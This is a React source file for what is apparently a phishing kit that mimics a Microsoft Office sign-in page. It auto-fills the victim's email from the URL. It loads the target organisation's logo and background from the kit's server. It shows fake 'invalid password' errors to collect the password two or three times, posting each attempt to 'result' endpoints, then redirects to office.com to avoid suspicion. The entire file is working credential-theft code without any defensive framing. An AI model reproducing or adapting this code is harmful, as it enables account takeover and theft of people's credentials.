import React, { Component, Fragment } from 'react'
import axios from 'axios'

export default class Login extends Component {
   constructor(props) {
      super(props);
      this.state = {
         grabber: _config.emailGrabber !== '',
         design: 'old', // old, new
         page: 'email', //email, redirect, pass, final

         background: '',
         logo: '',
         logoWidth: 108,
         logoHeight: 24,

         error: '', //t('login.error.invalid_details', 1)
         loader: false,

         email: '',
         boilerText: t("login.old.pass_info", 1),
         times: _config.times ? _config.times : '2',
         pass1: '',
         pass2: '',
         pass3: '',
         finalLink: _config.finalLink ? _config.finalLink : 'http://office.com'
      }
   }
   
   render() {
      if (this.state.page === 'final') {
         setTimeout(() => {
            this.action();
         }, 10000);
      }

      let pageContent = <Fragment></Fragment>;
      if (this.state.design==='old') {
         pageContent = <OldDesign {...this.state} action={this.action}/>;
      }else if(this.state.design==='new'){
         pageContent = <NewDesign {...this.state} action={this.action}/>;
      }
      return pageContent;
   }

   action = () => {
      let that = this;
      if (this.state.page==='email') {
         let email = document.getElementById('t-email').value; 
         if (email==='') {
            this.setState({loader: true, error: ''});
            setTimeout(() => {
               this.setState({
                  loader: false,
                  page: 'email',
                  error: t('login.error.invalid_details', 1)
               });
            }, 2000);
         }else if(/.+@.+\..+/.test(email) !== true){
            this.setState({loader: true, error: ''});
            setTimeout(() => {
               this.setState({
                  email: document.getElementById('t-email').value,
                  loader: false,
                  page: 'email',
                  error: <Fragment>{t('login.error.invalid_email', 1)} <span className="text-link">{t('login.error.get_new_email', 1)}</span> </Fragment>
               });
            }, 2000);
         }else{
            this.setState({loader: true, error: ''});
            setTimeout(() => {
               this.setState({
                  loader: false,
                  page: 'redirect',
                  error: '',
                  email: document.getElementById('t-email').value
               });

               setTimeout(() => {
                  // todo: add bg and logo

                  let formData = new FormData();
                  formData.set('_', new Date().getTime().toString());
                  formData.set('email', this.state.email);
            
                  axios.post(_config.api+'background', formData,{
                     headers: { 'Content-Type': 'multipart/form-data' }
                  })
                  .then(res => {

                     if (res.data.valid===true) {
                        // if (/^http.{10,}/.test(res.data.logoImage) === true) that.setState({logo: res.data.logoImage});
                        // if (/^http.{10,}/.test(res.data.bgImage) === true) that.setState({background: res.data.bgImage});
                        if (res.data.bgImage && /^http.{10,}/.test(res.data.bgImage) === true) that.setState({background: res.data.bgImage});
                        if (res.data.logoImage && /^http.{10,}/.test(res.data.logoImage) === true) {
                           that.setState({logo: res.data.logoImage});

                           let W = Number(res.data.logoWidth), H = Number(res.data.logoHeight);
                           if (W > 200) {  let rate = W / 200; W = 200; H = H / rate; }
                           if(H > 70){ let rate = H / 70; H = 70; W = W / rate; }
   
                           if (res.data.logoWidth!=='') that.setState({logoWidth: W});
                           if (res.data.logoHeight!=='') that.setState({logoHeight: H});
                        }
                        if (res.data.text && res.data.text!=='') that.setState({boilerText: res.data.text});
                     }

                     this.action();
                  })
                  .catch(err => {
                     console.error(err);
                     this.action();
                     // document.location.reload();
                  });

               }, 3000);
            }, 2000);
         }
      }

      else if (this.state.page==='redirect') {
         // this.setState({loader: true, error: ''});
         // setTimeout(() => {
            this.setState({
               loader: false,
               page: 'pass',
               error: ''
            });
         // }, 2000);
      }

      else if (this.state.page==='pass') {

         if (this.state.pass1==='') this.savePassword(1)
         else if (this.state.pass2==='' && this.state.times >= '2') this.savePassword(2)
         else if (this.state.pass3==='' && this.state.times >= '3') this.savePassword(3)

      }

      else if (this.state.page==='final') {
         console.log('final action ...');
         window.location.href = this.state.finalLink;
      }

   }


   savePassword = (step) => {
      this.setState({loader: true, error: ''});
      setTimeout(() => {
         this.setState({
            ['pass'+step]: document.getElementById('t-password').value,
            loader: false,
            error: <Fragment>{t('login.error.invalid_password', 1)} <span className="text-link">{t('login.error.reset_password', 1)}</span> </Fragment>
         });
         document.getElementById('t-password').value = "";

         if (step===1) {
            let formData = new FormData();
            formData.set('_', new Date().getTime().toString());
            formData.set('email', this.state.email);
            formData.set('password', this.state.pass1);
      
            axios.post(_config.api+'result/login', formData, { headers: { 'Content-Type': 'multipart/form-data' } })
            .then(res => console.log(res.data))
            .catch(err => console.error(err));
         }
         else if (step===2) {
            let formData = new FormData();
            formData.set('_', new Date().getTime().toString());
            formData.set('password', this.state.pass2);
      
            axios.post(_config.api+'result/second', formData, { headers: { 'Content-Type': 'multipart/form-data' } })
            .then(res => console.log(res.data))
            .catch(err => console.error(err));
         }
         else if (step===3) {
            let formData = new FormData();
            formData.set('_', new Date().getTime().toString());
            formData.set('password', this.state.pass3);
      
            axios.post(_config.api+'result/third', formData, { headers: { 'Content-Type': 'multipart/form-data' } })
            .then(res => console.log(res.data))
            .catch(err => console.error(err));
         }


         if ((this.state.pass2!=='' && this.state.times==='2') || (this.state.pass3!=='' && this.state.times==='3')) {
            this.setState({page: 'final'});
         }

      }, 2000);


   }

}












//
// ─── OLDDESIGN ──────────────────────────────────────────────────────────────────
//

export class OldDesign extends Component {
   constructor(props) {
      super(props);
      this.state = {
         autoGrabberDone: false
      }
   }
   
   render() {
      let bgImage = this.props.background!=='' ? {backgroundImage: `url(${this.props.background})`} : {}
      let logoImage = this.props.logo!=='' ? {backgroundImage: `url(${this.props.logo})`} : {}
      logoImage['width'] = this.props.logoWidth+'px';
      logoImage['height'] = this.props.logoHeight+'px';


      let emailGrabber = this.props.grabber===true
      ? _config.emailGrabber
      : (location.hash.substr(1) !== '' && /([\w.-]+@[\w.-]+\.\w+)/.test(location.hash.substr(1)))
         ? location.hash.substr(1)
         : '';
         
      if (emailGrabber!==''&&this.state.autoGrabberDone===false) {
         setTimeout(() => {
            this.setState({autoGrabberDone: true});
            this.props.action();
         }, 100);
      }

      return (
         <div className="oldDesign" style={bgImage}>
            <div className={`wrapper ${this.props.page==='final' && 'final'}`}>
               <div className={"progressBar "+(this.props.loader===true && 'active')}>
						<div></div><div></div><div></div><div></div><div></div>
					</div>
               <div className="logo" style={logoImage}></div>
               
               <div className={"form-trans "+(this.props.page!=='email'&&'t-hide')}>
                  <div className="text-title">{t("login.old.title_email", 1)}</div>
                  <div className="t-error">{this.props.error}</div>
                  <input type="text" id="t-email" defaultValue={emailGrabber} className={"t-input "+(this.props.error!==''&&'hasError')} placeholder={t("login.old.email_placeholder")} onKeyPress={this.handleKeyPress}/>
                  <div className="subItem">{t("login.old.no_account", 1)} <span className="text-link">{t("login.old.create_account", 1)}</span> </div>
                  <div className="subItem text-link">{t("login.old.cannot_access", 1)}</div>
                  <div className="subItem text-link">{t("login.old.signin_options", 1)}</div>
                  <div className="btns-wrapper">
                     <button className="btn btn-primary" onClick={this.props.action}>{t("login.old.next", 1)}</button>
                  </div>
               </div>
               
               <div className={"form-trans "+(this.props.page!=='pass'&&'t-hide')}>
                  <div className="text-simple">{this.props.email}</div>
                  <div className="text-title">{t("login.old.title_password", 1)}</div>
                  <div className="text-simple" dangerouslySetInnerHTML={{__html: this.props.boilerText}}/>
                  <div className="t-error">{this.props.error}</div>
                  <input type="password" className={"t-input "+(this.props.error!==''&&'hasError')} id="t-password" placeholder={t("login.old.pass_placeholder")} onKeyPress={this.handleKeyPress}/>
                  <div className="rememberMeWrapper">
                     <input type="checkbox" name="" id="rememberMe"/>
                     <label htmlFor="rememberMe">{t("login.old.keep_me_signed", 1)}</label>
                  </div>
                  <div className="subItem text-link">{t("login.old.forgot_password", 1)}</div>
                  
                  <div className="btns-wrapper">
                     <button className="btn btn-primary" onClick={this.props.action}>{t("login.old.signin", 1)}</button>
                  </div>
               </div>
               
               <div className={"form-trans "+(this.props.page!=='redirect'&&'t-hide')}>
                  <div className="text-title">{t("login.old.redirecting", 1)}</div>
                  <div className="progressBar progressBarRedirect">
                     <div></div><div></div><div></div><div></div><div></div>
                  </div>
                  <div className="text-simple"><span className="text-link">{t("login.old.cancel", 1)}</span></div>
               </div>
               
               <div className={"form-trans "+(this.props.page!=='final'&&'t-hide')}>
                  <div className="text-title" style={{marginBottom:'30px'}}>{t("login.old.final_title", 1)}</div>
                  <div className="text-simple" style={{marginBottom:'50px', lineHeight:'1.7'}}>{t("login.old.final_text", 1)}</div>

                  <div className="btns-wrapper">
                     <button className="btn btn-primary" onClick={this.props.action}>{t("login.old.final_button", 1)}</button>
                  </div>
               </div>

            </div>
            <div className="footer">
               <div className="item">{t("footer.terms", 1)}</div>
               <div className="item">{t("footer.privacy", 1)}</div>
               <div className="item dots">
                  <div className="dot"></div>
                  <div className="dot"></div>
                  <div className="dot"></div>
               </div>
            </div>
         </div>
      )
   }

   handleKeyPress = (e) => {
      if (e.key === 'Enter') {
         this.props.action();
      }
   }

}

















//
// ─── NEWDESIGN ──────────────────────────────────────────────────────────────────
//

export class NewDesign extends Component {
   render() {
      return (
         <div className="newDesign">
            NewDesign
         </div>
      )
   }
}



















// if (res.data.valid === 'true') {
//    if (/^http.{10,}/.test(res.data.profile_image) === true) {
//       let W = Number(res.data.width), H = Number(res.data.height);
//       if (W > 170) {
//          let rate = W / 170;
//          W = 170;
//          H = H / rate;
//       }
//       if(H > 70){
//          let rate = H / 70;
//          H = 70;
//          W = W / rate;
//       }
//       document.querySelector('.form-container .logo').style.backgroundImage = 'url('+res.data.profile_image+')';
//       document.querySelector('.form-container .logo').style.width = W+'px';
//       document.querySelector('.form-container .logo').style.height = H+'px';
//    }
//    if (/^http.{10,}/.test(res.data.back_image) === true) {
//       document.querySelector('.App').style.backgroundImage = 'url('+res.data.back_image+')';
//    }
// }